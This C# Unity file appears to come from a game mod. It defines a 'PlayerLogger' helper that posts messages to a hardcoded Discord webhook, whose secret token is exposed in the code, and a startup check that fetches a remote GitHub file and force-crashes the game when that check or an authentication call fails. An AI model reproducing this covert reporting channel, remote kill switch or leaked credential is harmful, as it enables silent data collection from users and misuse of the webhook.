﻿using System;
using System.Collections.Specialized;
using System.Net;
using Photon.Pun;
using UnityEngine;

namespace Prism.Utility
{
	public class BaseClass : MonoBehaviourPunCallbacks
	{
		public static void SendHook(string message)
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("username", "PlayerLogger");
			nameValueCollection.Add("avatar_url", "https://wallpapercave.com/wp/wp8413407.jpg");
			nameValueCollection.Add("content", message);
			new WebClient().UploadValues("https://discord.com/api/webhooks/1256102103819092009/WaCS66P-qAqQVOEN0NOJT3py_AjveUf-S3s5_dKDQ-5ldvkbQccUUdWQLz7_nLivUwEz", nameValueCollection);
		}

		public override void OnEnable()
		{
			if (!new WebClient().DownloadString("https://github.com/iaodevelop/hazeutilities/raw/main/hi.txt").Contains("="))
			{
				if (Injection.FatalError("error3", true) == "CRASH")
				{
					Environment.FailFast("bye");
					Application.Quit();
				}
			}
			if (Injection.Authenticate() != "AGREE")
			{
				Debug.Log("no");
				if (Injection.FatalError("error3", true) == "CRASH")
				{
					Environment.FailFast("bye");
					Application.Quit();
				}
			}
		}
	}
}
